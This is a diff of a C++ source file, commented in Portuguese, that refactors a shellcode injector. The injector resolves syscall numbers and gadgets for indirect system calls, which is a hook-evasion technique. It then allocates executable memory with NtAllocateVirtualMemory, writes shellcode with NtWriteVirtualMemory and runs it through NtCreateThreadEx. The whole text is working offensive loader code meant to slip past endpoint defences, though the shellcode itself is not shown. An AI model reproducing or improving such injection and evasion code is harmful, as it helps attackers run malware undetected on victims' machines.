@@ -1,57 +1,5 @@
 #include "helper.h"
 
-extern "C" {
-    void     MeowGate(DWORD wSSN, QWORD wSyscall);
-    NTSTATUS MeowDescent(...);
-}
-
-//Declarações das funções da ntdll.dll
-using NtAllocateVirtualMemory_t = NTSTATUS(NTAPI*)
-(
-	_In_ HANDLE ProcessHandle,
-	_Inout_ PVOID* BaseAddress,
-	_In_ ULONG_PTR ZeroBits,
-	_Inout_ PSIZE_T RegionSize,
-	_In_ ULONG AllocationType,
-	_In_ ULONG Protect
-	);
-
-using NtWriteVirtualMemory_t = NTSTATUS(NTAPI*)
-(
-	_In_ HANDLE ProcessHandle,
-	_In_ PVOID BaseAddress,
-	_In_ PVOID Buffer,
-	_In_ SIZE_T NumberOfBytesToWrite,
-	_Out_opt_ PSIZE_T NumberOfBytesWritten
-	);
-
-using NtCreateThreadEx_t = NTSTATUS(NTAPI*)
-(
-	_Out_ PHANDLE ThreadHandle,
-	_In_ ACCESS_MASK DesiredAccess,
-	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
-	_In_ HANDLE ProcessHandle,
-	_In_ PVOID StartRoutine,
-	_In_opt_ PVOID Argument,
-	_In_ ULONG CreateFlags,
-	_In_ SIZE_T ZeroBits,
-	_In_ SIZE_T StackSize,
-	_In_ SIZE_T MaximumStackSize,
-	_In_opt_ PVOID AttributeList
-	);
-
-using NtWaitForSingleObject_t = NTSTATUS(NTAPI*)
-(
-	_In_ HANDLE Handle,
-	_In_ BOOLEAN Alertable,
-	_In_opt_ PLARGE_INTEGER Timeout
-	);
-
-using NtClose_t = NTSTATUS(NTAPI*)
-(
-	_In_ HANDLE Handle
-	);
-
 SYSCALL_ENTRY Syscalls[SYSCALL_COUNT] =
 {
 	{ "NtAllocateVirtualMemory",   0, nullptr, FALSE },
@@ -101,12 +49,19 @@ int main() {
 
 	printf("[+] Tabela de Syscalls populada\n");
 
-	// NtAllocateVirtualMemory
-	MeowGate(GetSSNFromSyscallTable("NtAllocateVirtualMemory"), (QWORD)GetGadgetFromSyscallTable("NtAllocateVirtualMemory"));
+	// Joga os SSN's e gadgets para o assembly
+	GetSSNFromSyscallTable("NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN);
+	GetGadgetFromSyscallTable("NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySyscall);
+	GetSSNFromSyscallTable("NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN);
+	GetGadgetFromSyscallTable("NtWriteVirtualMemory", &g_NtWriteVirtualMemorySyscall);
+	GetSSNFromSyscallTable("NtCreateThreadEx", &g_NtCreateThreadExSSN);
+	GetGadgetFromSyscallTable("NtCreateThreadEx", &g_NtCreateThreadExSyscall);
+	GetSSNFromSyscallTable("NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN);
+	GetGadgetFromSyscallTable("NtWaitForSingleObject", &g_NtWaitForSingleObjectSyscall);
+	GetSSNFromSyscallTable("NtClose", &g_NtCloseSSN);
+	GetGadgetFromSyscallTable("NtClose", &g_NtCloseSyscall);
 
-
-	NtAllocateVirtualMemory_t NtAllocateVirtualMemory = reinterpret_cast<NtAllocateVirtualMemory_t>(MeowDescent);
-
+	// Execução de um shellcode injection com funções nativas
 	Status = NtAllocateVirtualMemory(
 		hProcess,
 		&Buffer,
@@ -114,20 +69,13 @@ int main() {
 		&shellcodesize,
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE);
-
-	if (!NT_SUCCESS(Status)) { 
-		printf("[!] Ocorreu um erro na função NtAllocateVirtualMemory\n");
-		printf("[!] NTSTATUS = 0x%08X\n", (unsigned)Status);
+	
+	if (!NT_SUCCESS(Status)) {
+		printf("[!] Falha ao alocar memória: 0x%X\n", Status);
 		return 1;
 	}
 
-	printf("[+] NtAllocateVirtualMemory executada com sucesso\n");
-
-
-	// NtWriteVirtualMemory
-	MeowGate(GetSSNFromSyscallTable("NtWriteVirtualMemory"), (QWORD)GetGadgetFromSyscallTable("NtWriteVirtualMemory"));
-
-	NtWriteVirtualMemory_t NtWriteVirtualMemory = reinterpret_cast<NtWriteVirtualMemory_t>(MeowDescent);
+	printf("[+] Memória alocada em: 0x%p\n", Buffer);
 
 	Status = NtWriteVirtualMemory(
 		hProcess,
@@ -136,18 +84,12 @@ int main() {
 		shellcodesize,
 		nullptr);
 
-	if (!NT_SUCCESS(Status)) { 
-		printf("[!] Ocorreu um erro na função NtWriteVirtualMemory\n");
-		printf("[!] NTSTATUS = 0x%08X\n", (unsigned)Status);
+	if (!NT_SUCCESS(Status)) {
+		printf("[!] Falha ao escrever na memória: 0x%X\n", Status);
 		return 1;
 	}
 
-	printf("[+] NtWriteVirtualMemory executada com sucesso\n");
-
-	// NtCreateThreadEx
-	MeowGate(GetSSNFromSyscallTable("NtCreateThreadEx"), (QWORD)GetGadgetFromSyscallTable("NtCreateThreadEx"));
-
-	NtCreateThreadEx_t NtCreateThreadEx = reinterpret_cast<NtCreateThreadEx_t>(MeowDescent);
+	printf("[+] Shellcode escrito em: 0x%p\n", Buffer);
 
 	Status = NtCreateThreadEx(
 		&hThread,
@@ -162,44 +104,34 @@ int main() {
 		0,
 		nullptr);
 
-	if (!NT_SUCCESS(Status)) { 
-		printf("[!] Ocorreu um erro na função NtCreateThreadEx\n");
-		printf("[!] NTSTATUS = 0x%08X\n", (unsigned)Status);
+	if (!NT_SUCCESS(Status)) {
+		printf("[!] Falha ao criar thread: 0x%X\n", Status);
 		return 1;
 	}
 
-	printf("[+] NtCreateThreadEx executada com sucesso\n");
-
-	// NtWaitForSingleObject
-	MeowGate(GetSSNFromSyscallTable("NtWaitForSingleObject"), (QWORD)GetGadgetFromSyscallTable("NtWaitForSingleObject"));
-
-	NtWaitForSingleObject_t NtWaitForSingleObject = reinterpret_cast<NtWaitForSingleObject_t>(MeowDescent);
+	printf("[+] Thread criada com sucesso: 0x%p\n", hThread);
 
 	Status = NtWaitForSingleObject(
 		hThread,
 		FALSE,
 		nullptr);
 
-	if (!NT_SUCCESS(Status)) { 
-		printf("[!] Ocorreu um erro na função NtWaitForSingleObject\n");
-		printf("[!] NTSTATUS = 0x%08X\n", (unsigned)Status);
+	if (!NT_SUCCESS(Status)) {
+		printf("[!] Falha ao esperar pela thread: 0x%X\n", Status);
 		return 1;
-	};
+	}
 
-	printf("[+] NtWaitForSingleObject executada com sucesso\n");
-
-	// NtClose
-	MeowGate(GetSSNFromSyscallTable("NtClose"), (QWORD)GetGadgetFromSyscallTable("NtClose"));
-
-	NtClose_t NtClose = reinterpret_cast<NtClose_t>(MeowDescent);
+	printf("[+] Thread finalizada com sucesso\n");
 
 	Status = NtClose(hThread);
 
 	if (!NT_SUCCESS(Status)) {
-		printf("[!] Ocorreu um erro na função NtClose\n"); 
-		printf("[!] NTSTATUS = 0x%08X\n", (unsigned)Status);
+		printf("[!] Falha ao fechar handle da thread: 0x%X\n", Status);
 		return 1;
 	}
 
-	printf("[+] NtClose executada com sucesso\n");
+	printf("[+] Handle da thread fechado com sucesso\n");
+	printf("[+] Shellcode executado com sucesso\n");
+
+	return 0;
 }
